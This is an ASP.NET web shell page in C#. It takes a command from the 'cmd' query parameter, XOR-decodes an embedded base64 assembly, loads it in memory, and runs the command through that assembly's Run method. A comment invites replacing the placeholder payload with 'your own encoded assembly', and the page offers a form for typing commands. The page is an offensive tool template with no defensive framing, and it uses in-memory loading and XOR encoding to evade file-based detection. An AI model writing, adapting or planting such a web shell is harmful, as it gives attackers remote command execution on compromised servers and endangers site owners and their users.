<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (string.IsNullOrEmpty(cmd)) return;

        // XOR-encoded byte[] of a helper assembly (compiled C# class with Run(string c))
        // This is a placeholder – replace with your own encoded assembly.
        byte[] encoded = Convert.FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA...");
        for (int i = 0; i < encoded.Length; i++) encoded[i] ^= 0x77;
        Assembly asm = Assembly.Load(encoded);
        MethodInfo m = asm.GetType("Helper").GetMethod("Run");
        if (m != null) m.Invoke(null, new object[] { cmd });
        Response.Write("In‑memory assembly executed command.");
    }
</script>
<html><body><h2>In-Memory XOR Assembly</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
